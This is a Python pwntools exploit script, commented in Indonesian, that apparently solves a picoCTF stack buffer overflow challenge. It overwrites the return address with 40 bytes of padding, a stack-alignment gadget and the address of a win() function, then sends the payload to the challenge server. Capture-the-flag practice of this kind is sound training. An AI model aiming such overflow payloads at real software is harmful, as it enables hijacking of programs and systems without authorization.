# exploit.py
from pwn import *

# ===================== CONFIG =====================
elf = ELF('./vuln')

LOCAL = False  # ganti True untuk test lokal

if LOCAL:
    io = process('./vuln')
else:
    io = remote('mysterious-sea.picoctf.net', 56371)

# ===================== ADDRESSES ==================
win_addr   = 0x401256   # alamat fungsi win()
ret_gadget = 0x40101a   # instruksi 'ret' untuk stack alignment

# ===================== EXPLOIT ====================
offset = 40             # dari cyclic: 40 byte sebelum return address

payload  = b'A' * offset    # isi buf + saved RBP dengan sampah
payload += p64(ret_gadget)  # fix stack alignment (dibutuhkan fopen di win)
payload += p64(win_addr)    # timpa return address → loncat ke win()

# ===================== FIRE =======================
io.sendlineafter(b'name: ', payload)
io.interactive()
